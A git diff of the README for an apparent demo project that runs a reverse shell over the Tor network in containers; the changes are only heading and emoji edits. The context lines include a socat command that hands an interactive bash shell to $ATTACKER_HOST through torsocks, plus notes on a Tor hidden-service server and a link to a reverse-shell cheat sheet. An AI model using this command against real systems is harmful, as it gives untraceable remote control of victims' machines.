@@ -53,7 +53,7 @@ Now open another instance of the terminal and run the **_start_rshell.sh_** scri
 
 You can see that the attacker gets access to the victim computer.
 
-## **🌐 Client explanation**
+## **📞 Client**
 
 In order for the client to be able to make calls to the attacker, the rshell container needs to be on the tor network and execute the following command:
 
@@ -67,7 +67,7 @@ torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER_HOST:
 
 The **_torsocks_** command guarantees the the victim's ability to making calls to hosts on the Tor network.
 
-## **🌐 Server explanation**
+## **🌐 Server**
 
 To create the server on the Tor network we must include the file **_torrc_** in the directory **_/etc/tor/_** this way we will get a host on the Tor network.
 
@@ -90,7 +90,7 @@ Every call the victim makes to host `lsgbhtjko6zcrgsyb2nzdx76rpyaycvivl5tnmwyq33
 
 ## **💥 Considerations**
 
-There are many ways to create a reverse shell as you can see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). We use socat because it's easy to create a reverse shell with interactive PTY and autocomplete. I'm not a racker and I'm far from it 😂. But some lamers out there make gigantic python scripts with interactive interfaces and lots of base 64 to do it. For a good lamer like me 😎, a sh terminal with busybox is enough. Using the Tor network to create a reverse shell makes it very difficult to identify the attacker. I could have used the **_alpine_** image instead of **_ubuntu_** to create the containers but there was a problem in socat and I was too lazy to do that 😅.
+There are many ways to create a reverse shell as you can see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). We use socat because it's easy to create a reverse shell with interactive PTY and autocomplete. I'm not a racker and I'm far from it. But some lamers out there make gigantic python scripts with interactive interfaces and lots of base 64 to do it. For a good lamer a sh terminal with busybox is enough. Using the Tor network to create a reverse shell makes it very difficult to identify the attacker. I could have used the **_alpine_** image instead of **_ubuntu_** to create the containers but there was a problem in socat and I was too lazy to do that.
 
 ## **📚 References**
 
